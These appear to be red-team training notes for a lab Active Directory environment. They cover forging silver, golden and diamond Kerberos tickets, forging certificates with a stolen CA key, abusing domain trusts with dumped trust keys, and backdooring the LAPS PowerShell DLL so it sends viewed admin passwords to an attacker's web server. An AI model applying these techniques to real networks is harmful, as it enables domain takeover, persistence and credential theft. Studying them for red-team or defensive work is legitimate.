## Silver Tickets

---

A "silver ticket" is a forged service ticket, signed using the secret material (RC4/AES keys) of a computer account.  You may forge a TGS for any user to any service on that machine, which is useful for short/medium-term persistence.  By default, computer passwords change every 30 days, at which time you must re-obtain the new secrets to continue making silver tickets.  Both silver and golden (coming up next) tickets are forged, so can be generated on your own machine and imported into your Beacon session for use.

Let's say we dumped Kerberos keys from Workstation 1 from a SYSTEM Beacon.

Use Rubeus to forge a service ticket for nlamb and the CIFS service.

[[Rubeus#silver]]

Then import the ticket.

[[Rubeus#createonly#Pass the Ticket]]

```
steal_token <PID>
```

Here are some useful ticket combinations:

|**Technique**|**Required Service Tickets**|
|---|---|
|psexec|HOST & CIFS|
|winrm|HOST & HTTP|
|dcsync (DCs only)|LDAP|


## Golden Tickets

---

A "golden ticket" is a forged TGT, signed by the domain's krbtgt account.  Where a silver ticket can be used to impersonate any user, it's limited to either that single service or to any service but on a single machine.  A golden ticket can be used to impersonate any user, to any service, on any machine in the domain; and to add insult to injury - the underlying credentials are never changed automatically.  For that reason, the krbtgt NTLM/AES hash is probably the single most powerful secret you can obtain (and is why you see it used in dcsync examples so frequently).

A common method for obtaining the krbtgt hash is to use dcsync from the context of a domain admin.

```
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
```

The ticket can be forged offline using Rubeus.

[[Rubeus#golden]]

And then imported into a logon session to use.

[[Rubeus#createonly#Pass the Ticket]]

```
steal_token <PID>
```


### Domain Trusts

The process is the same as creating Golden Tickets previously, the only additional information required is the SID of a target group in the parent domain.

```
beacon> powershell Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
```

```
beacon> powershell Get-DomainController -Domain cyberbotic.io | select Name
```

Create the golden ticket with Rubeus.

[[Rubeus#golden#Extra SIDs]]

Then import it into a logon session and use it to access the domain controller in the parent.

```
beacon> run klist
```



## Diamond Tickets

---

Like a golden ticket, a diamond ticket is a TGT which can be used to access any service as any user.  A golden ticket is forged completely offline, encrypted with the krbtgt hash of that domain, and then passed into a logon session for use.  Because domain controllers don't track TGTs it (or they) have legitimately issued, they will happily accept TGTs that are encrypted with its own krbtgt hash.

Therefore, a possible tactic to detect the use of golden tickets is to look for TGS-REQs that have no corresponding AS-REQ.  A "diamond ticket" is made by modifying the fields of a legitimate TGT that was issued by a DC.  This is achieved by requesting a TGT, decrypting it with the domain's krbtgt hash, modifying the desired fields of the ticket, then re-encrypting it.  This overcomes the aforementioned shortcoming of a golden ticket because any TGS-REQs will have a preceding AS-REQ.

Diamond tickets can be created with Rubeus.

[[Rubeus#diamond]]

Rubeus `describe` will now show that this is a TGT for the target user.

[[Rubeus#describe]]


### Domain Trusts

The Rubeus `diamond` command also has a `/sids` parameter, with which we can supply the extra SIDs we want in our ticket.

[[Rubeus#diamond#Extra SIDs]]

If dev.cyberbotic.io also had a child (e.g. test.dev.cyberbotic.io), then a DA in TEST would be able to use their krbtgt to hop to DA/EA in cyberbotic.io instantly because the trusts are transitive.

There are also other means which do not require DA in the child.  For example, you can also kerberoast ([[Credential Theft#Kerberoasting]]) and ASREProast ([[Credential Theft#ASREP Roasting]]) across domain trusts, which may lead to privileged credential disclosure.  Because principals in CYBER can be granted access to resources in DEV, you may find instances where they are accessing machines we have compromised.  If they interact with a machine with unconstrained delegation, we can capture their TGTs.  If they're on a machine interactively, such as RDP, we can impersonate them just like any other user.


## Forged Certificates

---

In larger organisations, the AD CS roles are installed on separate servers and not on the domain controllers themselves.  Often times, they are also not treated with the same sensitivity as DCs.  So, whereas only EAs and DAs can access/manage DCs, "lower level" roles such as server admins can access the CAs.  Although this can be seen a privilege escalation, it's just as useful as a domain persistence method.

Gaining local admin access to a CA allows an attacker to extract the CA private key, which can be used to sign a forged certificate (think of this like the krbtgt hash being able to sign a forged TGT).  The default validity period for a CA private key is 5 years, but this can be set to any value during setup, sometimes as high as 10+ years.

Once on a CA, [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) can extract the private keys.

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
```

Save the private key and certificate to a `.pem` file and convert it to a `.pfx` with openssl.  Then, build the forged certificate with [ForgeCert](https://github.com/GhostPack/ForgeCert).

```
PS C:\Users\Attacker> C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123
```

Even though you can specify any SubjectAltName, the user does need to be present in AD.  We can now use Rubeus to request a legitimate TGT with this forged certificate.

[[Rubeus#asktgt#Get AES Ticket]]

We're not limited to forging user certificates; we can do the same for machines.  Combine this with the S4U2self trick to gain access to any machine or service in the domain. [[Rubeus#s4u self#altservice#Pass the Ticket]]


## Domain Trusts

---

### One-Way Inbound

dev.cyberbotic.io also has a one-way inbound trust with dev-studio.com.

[[PowerView#Get-DomainTrust]]

```
SourceName      : dev.cyberbotic.io
TargetName      : dev-studio.com
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
WhenCreated     : 8/16/2022 9:52:37 AM
WhenChanged     : 8/16/2022 9:52:37 AM
```

Because the trust is inbound from our perspective, it means that principals in our domain can be granted access to resources in the foreign domain.  We can enumerate the foreign domain across the trust.

[[PowerView#Get-DomainComputer]]

[[PowerView#Get-DomainForeignGroupMember]] will enumerate any groups that contain users outside of its domain and return its members.

```
GroupDomain             : dev-studio.com
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=dev-studio,DC=com
MemberDomain            : dev-studio.com
MemberName              : S-1-5-21-569305411-121244042-2357301523-1120
MemberDistinguishedName : CN=S-1-5-21-569305411-121244042-2357301523-1120,CN=ForeignSecurityPrincipals,DC=dev-studio,DC=com
```

This output shows that there's a member of the domain's built-in Administrators group who is not part of dev-studio.com. The MemberName field contains a SID that can be resolved in our current domain.

[[PowerView#ConvertFrom-SID]]

```
DEV\Studio Admins
```

This means that members of DEV\Studio Admins are also members of the built-in Administrators group of dev-studio.com and therefore inherit local admin access to dc.dev-studio.com.  If this is confusing, this is how it looks from the perspective of the foreign domain controller.

To hop this trust, we only need to impersonate a member of this Studio Admins domain group.

[[PowerView#Get-DomainGroupMember]]

To hop a domain trust using Kerberos, we first need an inter-realm key.  Obtain a TGT for the target user (here I am using `asktgt` with their AES256 hash).

[[Rubeus#asktgt#Get AES Ticket]]

Next, use that TGT to request a referral ticket from the current domain to the target domain.

[[Rubeus#asktgs]]

Finally, use this inter-realm ticket to request TGS's in the target domain.  Here, I'm requesting a ticket for CIFS `/service:cifs/dc.dev-studio.com`.

[[Rubeus#asktgs]]

```
beacon> run klist
```


### One-Way Outbound

Remember that if Domain A trusts Domain B, users in Domain B can access resources in Domain A; but users in Domain A should not be able to access resources in Domain B.  If we're in Domain A, then it's by design that we should not be able to access Domain B.  An outbound trust exists between cyberbotic.io and msp.org.  The direction of trust is such that cyberbotic.io trusts msp.org (so users of msp.org can access resources in cyberbotic.io).

Because DEV has a trust with CYBER, we can query the trusts that it has by adding the `-Domain` parameter.

[[PowerView#Get-DomainTrust]]

We can still partially exploit this trust and obtain "domain user" access from CYBER to MSP by leveraging the shared credential for the trust.  Both domains in a trust relationship store a shared password (which is automatically changed every 30 days) in a Trusted Domain Object (TDO).  These objects are stored in the system container and can be read via LDAP.  Here we see that the DC in CYBER has two TDOs for its trusts with DEV and MSP.

[[ADSearch#Enumerate Trusted Domains]]

There are two options for obtaining the key material.  One is to move laterally to the DC itself and dump from memory.

[[mimikatz#trust]]

The second is to use DCSync with the TDO's GUID.

[[PowerView#Get-DomainObject]]

[[mimikatz#dcsync#For Domain and GUID]]

```
[DC] 'cyberbotic.io' will be the domain
[DC] 'dc-1.cyberbotic.io' will be the DC server
[DC] Object with GUID '{b93d2e36-48df-46bf-89d5-2fc22c139b43}'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : msp.org

** TRUSTED DOMAIN - Antisocial **

Partner              : msp.org
 [ Out ] MSP.ORG -> CYBERBOTIC.IO
    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
	* aes128_hmac       9851d2d80411e6d40122005d1c361579
	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496

 [Out-1] MSP.ORG -> CYBERBOTIC.IO
    * 8/16/2022 9:49:17 AM - CLEAR   - 93 8e aa 1f 5f 6e 2a cc 51 7d d4 a8 07 f2 f0 2c a3 e0 20 3b 24 32 68 58 0d f8 ad cc
	* aes256_hmac       5db44be4317433d5ab1d3dea5925126d295d3e21c9682bca7fef76bc5a878f30
	* aes128_hmac       9851d2d80411e6d40122005d1c361579
	* rc4_hmac_nt       f3fc2312d9d1f80b78e67d55d41ad496
```

`[Out]` and `[Out-1]` are the "new" and "old" passwords respectively (they're the same here because 30 days hasn't elapsed since the creation of the trust).  In most cases, the current [Out] key is the one you want.  In addition, there is also a "trust account" which is created in the "trusted" domain, with the name of the "trusting" domain.  For instance, if we get all the user accounts in the DEV domain, we'll see _CYBER\$_ and _STUDIO\$_, which are the trust accounts for those respective domain trusts.

[[ADSearch#Get All Object with "user" Category]]

```
[*] TOTAL NUMBER OF SEARCH RESULTS: 11

        [...]
	[+] cn : CYBER$
	[+] cn : STUDIO$
```

This means that the MSP domain will have a trust account called CYBER$, even though we can't enumerate across the trust to confirm it.  This is the account we must impersonate to request Kerberos tickets across the trust.

[[Rubeus#asktgt#Request with RC4]]

This TGT can now be used to interact with the domain.

```
beacon> run klist
beacon> powershell Get-Domain -Domain msp.org

Forest                  : msp.org
DomainControllers       : {ad.msp.org}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : ad.msp.org
RidRoleOwner            : ad.msp.org
InfrastructureRoleOwner : ad.msp.org
Name                    : msp.org
```

This account is obviously not a domain admin, but there are multiple abuse primitives that can now be performed across the trust to elevate privileges - including kerberoasting, ASREPRoasting, RBCD, and vulnerable certificate templates.


## LAPS Backdoors

---

There are some techniques that we can leverage to backdoor the LAPS administrative tooling and obtain a copy of passwords when viewed by an admin.  This module will demonstrate this idea using the LAPS PowerShell cmdlet `Get-AdmPwdPassword`.  If installed on a machine, the LAPS PowerShell modules can be found under `C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS`.

```
beacon> ls
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\
```

Since PowerShell heavily utilises the .NET Framework, the DLLs here are written in C# which makes them fairly trivial to download, modify and re-upload.  Download `AdmPwd.PS.dll` and `AdmPwd.Utils.dll`, sync them to your attacking machine and open AdmPwd.PS.dll with dnSpy.  Use the Assembly Explorer to drill down into the DLL, namespaces and classes until you find the `GetPassword` method.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/388/e3f/f67/dnspy.png)

This method calls `DirectoryUtils.GetPasswordInfo` which returns a `PasswordInfo` object.  You can click on the name and dnSpy will take you to the class definition.  It contains properties for `ComputerName`, `DistinguishedName`, `Password` and `ExpirationTimestamp`.  The password is simply the plaintext password that is shown to the admin.

Let's modify the code to send the plaintext passwords to us over an HTTP GET request.

  **OPSEC**  
  
This is obviously an irresponsible method to use in the real world, because the plaintext password is being sent unencrypted over the wire.  This is just an example.

Go back to the GetPassword method, right-click somewhere in the main window and select _Edit Method_.  The first thing we need to do is add a new assembly reference, using the little button at the bottom of the edit window.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/e6e/92f/535/add-reference.png)

Use the search box to find and add `System.Net`.

This code will simply instantiate a new `WebClient` and call the `DownloadString` method, passing the computer name and password in the URI.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/497/f24/92f/backdoor.png)

Once the modifications are in place, click the _Compile_ button in the bottom-right of the edit window.  Then select _File > Save Module_ to write the changes to disk.  Upload the DLL back to the target to overwrite the existing file.

```
beacon> upload C:\Users\Attacker\Desktop\AdmPwd.PS.dll
```

One downside to this tactic is that it will break the digital signature of the DLL, but it will not prevent PowerShell from using it.

```
beacon> powershell Get-AuthenticodeSignature *.dll

    Directory: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS

SignerCertificate                         Status                                 Path                                  
-----------------                         ------                                 ----                                  
                                          NotSigned                              AdmPwd.PS.dll                         
ABDCA79AF9DD48A0EA702AD45260B3C03093FB4B  Valid                                  AdmPwd.Utils.dll 
```

As nlamb on Workstation 1, grab the LAPS password for a computer.

```
PS C:\Users\nlamb> Get-AdmPwdPassword -ComputerName sql-2 | fl

ComputerName        : SQL-2
DistinguishedName   : CN=SQL-2,OU=SQL Servers,OU=Servers,DC=dev,DC=cyberbotic,DC=io
Password            : VloWch1sc5Hl40
ExpirationTimestamp : 9/17/2022 12:46:28 PM
```

You should see a corresponding hit in your CS weblog.

```
09/14 11:49:32 visit (port 80) from: 10.10.122.254
	Request: GET /
	Response: 404 Not Found
	null
	= Form Data=
	computer   = SQL-2
	pass       = VloWch1sc5Hl40
```